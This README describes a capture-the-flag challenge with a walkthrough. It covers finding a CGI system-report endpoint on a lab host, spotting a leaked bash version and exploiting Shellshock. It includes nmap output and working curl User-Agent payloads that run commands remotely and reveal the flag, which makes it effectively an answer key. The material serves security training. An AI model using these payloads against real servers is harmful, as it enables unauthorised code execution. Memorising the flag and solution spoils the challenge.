# Shockwave Report

This challenge deploys a machine vulnerable to shellshock. 

### Task

A user must find HTTP endpoint that reports various system information via cgi-script including a bash version, discover
that the bash version is vulnerable to shellshock and exploit the script to pwn the system.



## How to solve
<details>
  <summary>Click to reveal how to solve steps</summary>

1. The task reveals IP address `172.20.0.39`. Let's nmap it:
```bash
root@hackerlab:~# nmap -n -v 172.20.0.39
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-09 07:18 UTC
Initiating ARP Ping Scan at 07:18
Scanning 172.20.0.39 [1 port]
Completed ARP Ping Scan at 07:18, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 07:18
Scanning 172.20.0.39 [1000 ports]
Discovered open port 80/tcp on 172.20.0.39
Completed SYN Stealth Scan at 07:18, 0.05s elapsed (1000 total ports)
Nmap scan report for 172.20.0.39
Host is up (0.0000070s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:14:00:27 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.032KB)
```

2. We find HTTP port 80. After sending some HTTP requests, we find /report endpoint:
```bash
root@hackerlab:~# curl 172.20.0.39
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>


root@hackerlab:~# curl 172.20.0.39/index.html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" />
    <title>Redirecting...</title>
</head>
<body>
    <p>If you are not redirected, <a href="/report">click here</a>.</p>
</body>
</html>


root@hackerlab:~# curl 172.20.0.39/report    
<html><body>
<h1>System Information Report</h1>
<p><strong>Server Uptime:</strong>  07:19:28 up 31 min,  0 user,  load average: 1.01, 1.65, 1.45</p>
<p><strong>Disk Usage:</strong></p>
<pre>Filesystem                     Size  Used Avail Use% Mounted on
overlay                        914G  347G  522G  40% /
tmpfs                           64M     0   64M   0% /dev
shm                             64M     0   64M   0% /dev/shm
/dev/mapper/whatever--vg-root  914G  347G  522G  40% /etc/hosts
tmpfs                           16G     0   16G   0% /proc/asound
tmpfs                           16G     0   16G   0% /proc/acpi
tmpfs                           16G     0   16G   0% /sys/firmware
tmpfs                           16G     0   16G   0% /sys/devices/virtual/powercap</pre>
<p><strong>Memory Usage:</strong></p>
<pre>               total        used        free      shared  buff/cache   available
Mem:           31831        6686       17877         700        8426       25144
Swap:            975           0         975</pre>
<p><strong>Currently Logged In Users:</strong></p>
<pre></pre>
<p><strong>Top 5 Processes by CPU Usage:</strong></p>
<pre>    PID    PPID CMD                         %MEM %CPU
      1       0 httpd -DFOREGROUND           0.0  0.0
     64       1 httpd -DFOREGROUND           0.0  0.0
      8       1 httpd -DFOREGROUND           0.0  0.0
     36       1 httpd -DFOREGROUND           0.0  0.0
    109      64 /bin/bash /usr/local/apache  0.0  0.0</pre>
<p><strong>Network Configuration:</strong></p>
<pre></pre>
<!-- Debug Info: Bash Version: GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) -->
<p><strong>Diagnostic Mode Disabled:</strong> Enable diagnostics by setting DEBUG=true in the environment.</p>
</body></html>
```
3. Among other information, the user should notice leaked bash version `GNU bash, version 4.2.37`. Google reveals that this
bash version is vulnerable to shellshock. Shellshock PoC can be then found online and used for RCE to find a flag.
```bash
root@hackerlab:~# curl -s -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/ls" 172.20.0.39/report 
printenv
printenv.vbs
printenv.wsf
report
test-cgi
root@hackerlab:~# curl -s -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat report" 172.20.0.39/report 
#!/bin/bash

# oh no, you found me :(
# BSY{cIAXNcTzjPEkH5nZU1LV6uPrSIvHpGPEoApUQXfkyftsZOmnsUokQeUfDmEW}

echo "Content-type: text/html"
echo
...
```





</details>

## Testing

The script [auto-solve.sh](./auto-solve.sh) automatically verifies that the challenge can be solved.